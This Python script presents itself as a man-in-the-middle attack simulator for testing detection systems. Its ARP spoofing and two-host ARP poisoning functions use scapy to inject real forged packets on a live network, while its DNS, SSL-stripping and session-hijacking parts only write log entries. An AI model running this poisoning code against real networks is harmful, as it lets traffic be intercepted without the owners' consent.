#!/usr/bin/env python3
"""
Man-in-the-Middle (MITM) Attack Simulator
Simulates ARP spoofing and packet sniffing attacks for testing detection systems.

Attack scenarios:
1. ARP Spoofing - Impersonate gateway to intercept traffic
2. Packet Sniffing - Capture packets from network
3. DNS Spoofing - Redirect DNS queries
4. SSL Stripping - Remove HTTPS encryption
5. Session Hijacking - Steal session tokens
"""

import argparse
import json
import os
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, UDP, DNSQR, DNSRR, Raw, sendp, 
        get_if_hwaddr, conf
    )
except ImportError:
    print("Scapy required: pip install scapy", file=sys.stderr)
    sys.exit(1)


class MITMAttackSimulator:
    """Simulates MITM attacks for testing detection"""
    
    def __init__(self, target_ip, gateway_ip, attacker_mac=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.attacker_mac = attacker_mac or get_if_hwaddr(conf.iface)
        self.attack_log = []
        
    def _log_attack(self, attack_type, details):
        """Log attack simulation"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "attack_type": attack_type,
            "details": details
        }
        self.attack_log.append(log_entry)
        print(f"[ATTACK] {attack_type}: {details}")
    
    def arp_spoof(self, target_ip, spoof_ip, duration=10, interval=1):
        """
        ARP Spoofing Attack
        Impersonate <spoof_ip> to target to redirect traffic through attacker
        """
        print(f"\n[MITM] Starting ARP Spoofing")
        print(f"       Target: {target_ip}")
        print(f"       Spoofing: {spoof_ip}")
        print(f"       Duration: {duration}s, Interval: {interval}s\n")
        
        try:
            target_mac = self._get_mac(target_ip)
            spoof_mac = self._get_mac(spoof_ip)
            
            start_time = time.time()
            packet_count = 0
            
            while time.time() - start_time < duration:
                # Create spoofed ARP reply (saying we are spoof_ip)
                arp_reply = Ether(
                    dst=target_mac,
                    src=self.attacker_mac
                ) / ARP(
                    op="is-at",                    # ARP reply
                    pdst=target_ip,                # Tell target
                    hwdst=target_mac,              # (target MAC)
                    psrc=spoof_ip,                 # That we are spoof_ip
                    hwsrc=self.attacker_mac        # (our MAC)
                )
                
                sendp(arp_reply, iface=conf.iface, verbose=0)
                packet_count += 1
                
                self._log_attack("ARP_SPOOF_PACKET_SENT", {
                    "target_ip": target_ip,
                    "spoof_ip": spoof_ip,
                    "packet_number": packet_count,
                    "attacker_mac": self.attacker_mac
                })
                
                time.sleep(interval)
            
            print(f"\n[MITM] ARP Spoofing attack sent {packet_count} packets")
            return packet_count
            
        except Exception as e:
            print(f"[ERROR] ARP spoofing failed: {e}")
            return 0
    
    def dual_arp_spoof(self, target1_ip, target2_ip, duration=10):
        """
        ARP Spoofing - MITM between two hosts
        Attacker becomes MITM between target1 and target2
        """
        print(f"\n[MITM] Starting Dual ARP Spoofing (Man-in-the-Middle)")
        print(f"       Host 1: {target1_ip}")
        print(f"       Host 2: {target2_ip}")
        print(f"       Duration: {duration}s\n")
        
        try:
            mac1 = self._get_mac(target1_ip)
            mac2 = self._get_mac(target2_ip)
            
            start_time = time.time()
            packet_count = 0
            
            while time.time() - start_time < duration:
                # Spoof ARP: Tell host1 we are host2
                arp1 = Ether(dst=mac1, src=self.attacker_mac) / ARP(
                    op="is-at",
                    pdst=target1_ip,
                    hwdst=mac1,
                    psrc=target2_ip,
                    hwsrc=self.attacker_mac
                )
                
                # Spoof ARP: Tell host2 we are host1
                arp2 = Ether(dst=mac2, src=self.attacker_mac) / ARP(
                    op="is-at",
                    pdst=target2_ip,
                    hwdst=mac2,
                    psrc=target1_ip,
                    hwsrc=self.attacker_mac
                )
                
                sendp([arp1, arp2], iface=conf.iface, verbose=0)
                packet_count += 2
                
                self._log_attack("DUAL_ARP_SPOOF", {
                    "host1": target1_ip,
                    "host2": target2_ip,
                    "packets_sent": packet_count,
                    "attacker_mac": self.attacker_mac
                })
                
                time.sleep(1)
            
            print(f"\n[MITM] MITM attack sent {packet_count} ARP packets")
            return packet_count
            
        except Exception as e:
            print(f"[ERROR] Dual ARP spoofing failed: {e}")
            return 0
    
    def dns_spoof(self, target_ip, duration=10, port=53):
        """
        DNS Spoofing Attack
        Intercept DNS queries and return fake responses
        """
        print(f"\n[MITM] Starting DNS Spoofing")
        print(f"       Target: {target_ip}")
        print(f"       Duration: {duration}s\n")
        
        print("[!] Note: This simulation logs attack packets")
        print("[!] Actual DNS spoofing requires running DNS proxy\n")
        
        self._log_attack("DNS_SPOOF_ATTEMPT", {
            "target_ip": target_ip,
            "port": port,
            "duration": duration,
            "status": "SIMULATED_IN_LOG"
        })
    
    def ssl_strip_simulation(self, target_ip, duration=10):
        """
        SSL Stripping Simulation
        Pretend to downgrade HTTPS to HTTP
        """
        print(f"\n[MITM] Starting SSL Stripping Simulation")
        print(f"       Target: {target_ip}")
        print(f"       Duration: {duration}s\n")
        
        print("[!] Actual SSL stripping requires mitmproxy or similar")
        print("[!] This simulation logs the attack attempt\n")
        
        self._log_attack("SSL_STRIP_ATTEMPT", {
            "target_ip": target_ip,
            "duration": duration,
            "protocol": "HTTPS to HTTP downgrade",
            "status": "SIMULATED_IN_LOG"
        })
    
    def session_hijacking_simulation(self, target_ip, session_tokens=None):
        """
        Session Hijacking Simulation
        Logs attempt to steal session tokens
        """
        print(f"\n[MITM] Starting Session Hijacking Simulation")
        print(f"       Target: {target_ip}\n")
        
        tokens = session_tokens or [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
            "PHPSESSID=a1b2c3d4e5f6g7h8...",
            "session_token=xyz789abc123..."
        ]
        
        for i, token in enumerate(tokens):
            self._log_attack("SESSION_TOKEN_CAPTURE", {
                "target_ip": target_ip,
                "token_number": i + 1,
                "token_preview": token[:40] + "...",
                "token_type": self._identify_token_type(token)
            })
            time.sleep(0.5)
    
    def _identify_token_type(self, token):
        """Identify token type"""
        if token.startswith("eyJ"):
            return "JWT"
        elif "PHPSESSID" in token:
            return "PHP_SESSION"
        elif "session_token" in token:
            return "CUSTOM_SESSION"
        return "UNKNOWN"
    
    def _get_mac(self, ip):
        """Get MAC address for IP"""
        try:
            result = subprocess.run(
                ["arp", "-n", ip],
                capture_output=True,
                text=True,
                timeout=5
            )
            for line in result.stdout.split('\n'):
                parts = line.split()
                for part in parts:
                    if ':' in part and len(part.split(':')) == 6:
                        return part
        except:
            pass
        return "00:00:00:00:00:00"
    
    def generate_report(self):
        """Generate attack simulation report"""
        return {
            "timestamp": datetime.now().isoformat(),
            "attack_count": len(self.attack_log),
            "attacks": self.attack_log
        }


def main():
    parser = argparse.ArgumentParser(
        description="MITM Attack Simulator - Simulates various MITM attacks"
    )
    parser.add_argument("--target", required=True,
                       help="Target IP address")
    parser.add_argument("--gateway", default="192.168.1.1",
                       help="Gateway IP address")
    parser.add_argument("--attack-type", default="arp",
                       choices=["arp", "dual-arp", "dns", "ssl", "session", "all"],
                       help="Type of attack to simulate")
    parser.add_argument("--duration", type=int, default=10,
                       help="Attack duration in seconds")
    parser.add_argument("--output", default="logs/mitm-simulation.jsonl",
                       help="Output log file")
    parser.add_argument("--attacker-mac", default="",
                       help="Attacker MAC address (auto-detected if not specified)")
    parser.add_argument("--interface", default=conf.iface,
                       help="Network interface for packet injection")
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("ERROR: Must run as root to send ARP packets", file=sys.stderr)
        sys.exit(1)

    conf.iface = args.interface
    
    # Create output directory
    Path(args.output).parent.mkdir(parents=True, exist_ok=True)
    
    simulator = MITMAttackSimulator(
        target_ip=args.target,
        gateway_ip=args.gateway,
        attacker_mac=args.attacker_mac
    )
    
    print("="*60)
    print("MITM ATTACK SIMULATOR")
    print("="*60 + "\n")
    print(f"Interface: {conf.iface}\n")
    
    # Run attacks
    if args.attack_type in ["arp", "all"]:
        simulator.arp_spoof(args.target, args.gateway, duration=args.duration)
    
    if args.attack_type in ["dual-arp", "all"]:
        simulator.dual_arp_spoof(args.target, args.gateway, duration=args.duration)
    
    if args.attack_type in ["dns", "all"]:
        simulator.dns_spoof(args.target, duration=args.duration)
    
    if args.attack_type in ["ssl", "all"]:
        simulator.ssl_strip_simulation(args.target, duration=args.duration)
    
    if args.attack_type in ["session", "all"]:
        simulator.session_hijacking_simulation(args.target)
    
    # Generate report
    report = simulator.generate_report()
    
    print("\n" + "="*60)
    print("ATTACK SIMULATION REPORT")
    print("="*60)
    print(json.dumps(report, indent=2))
    
    # Save log
    with open(args.output, "a") as f:
        for attack in report["attacks"]:
            f.write(json.dumps(attack) + "\n")
    
    print(f"\nLog saved to: {args.output}")


if __name__ == "__main__":
    main()
